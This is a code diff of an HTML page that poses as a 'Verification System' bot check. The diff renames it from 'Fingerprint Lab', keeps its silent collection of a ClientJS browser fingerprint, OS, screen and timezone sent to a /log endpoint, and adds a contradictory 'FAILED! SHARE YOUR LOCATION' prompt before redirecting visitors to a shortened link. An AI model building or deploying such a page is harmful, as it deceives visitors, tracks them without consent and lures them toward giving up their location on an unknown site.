@@ -4,9 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-  <title>Fingerprint Lab</title>
+  <title>Verification System</title>
 
-  <!-- ClientJS CDN -->
+  <!-- ClientJS -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.2.1/client.min.js"></script>
 
   <style>
@@ -14,7 +14,7 @@
       margin: 0;
       background: #0b0f19;
       color: white;
-      font-family: Arial;
+      font-family: Arial, sans-serif;
 
       display: flex;
       justify-content: center;
@@ -34,7 +34,7 @@
     }
 
     .status {
-      margin-top: 10px;
+      margin-top: 12px;
       color: #aaa;
       font-size: 14px;
     }
@@ -45,7 +45,7 @@
 
 <div class="box">
   <h1>🔐 VERIFYING...</h1>
-  <div class="status" id="status">Initializing...</div>
+  <div class="status" id="status">Starting...</div>
 </div>
 
 <script>
@@ -55,50 +55,52 @@ function setStatus(msg) {
 
 async function start() {
   try {
-    setStatus("Loading ClientJS...");
+    setStatus("Initializing ClientJS...");
 
     const client = new ClientJS();
 
-    setStatus("Collecting fingerprint...");
-
-    const fingerprint = client.getFingerprint();
+    setStatus("Collecting device data...");
 
     const payload = {
-      fingerprint,
+      fingerprint: client.getFingerprint(),
       browser: client.getBrowser(),
       os: client.getOS(),
       screen: client.getScreenPrint(),
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 
-    setStatus("Sending data...");
+    setStatus("Sending to server...");
 
     const res = await fetch("/log", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify(payload)
     });
 
     await res.json();
 
-    // ✅ SUCCESS + REDIRECT COUNTDOWN
-    setStatus("Verification complete ✔");
+    // SUCCESS MESSAGE
+    setStatus("Verification successful ✔");
 
-    let count = 3;
+    // REDIRECT COUNTDOWN
+    let count = 5;
 
     const timer = setInterval(() => {
-      setStatus("Redirecting... " + count);
+      setStatus("FAILED! \n SHARE YOUR LOCATION TO VERIFY YOU ARE NOT ROBOT. \nRedirecting... " + count);
       count--;
 
       if (count === 0) {
         clearInterval(timer);
+
         window.location.href =
           "https://urlto.me/2wTJ1";
       }
     }, 1000);
 
   } catch (err) {
-    setStatus("ERROR: " + err.message);
+    setStatus("Error: " + err.message);
   }
 }
 
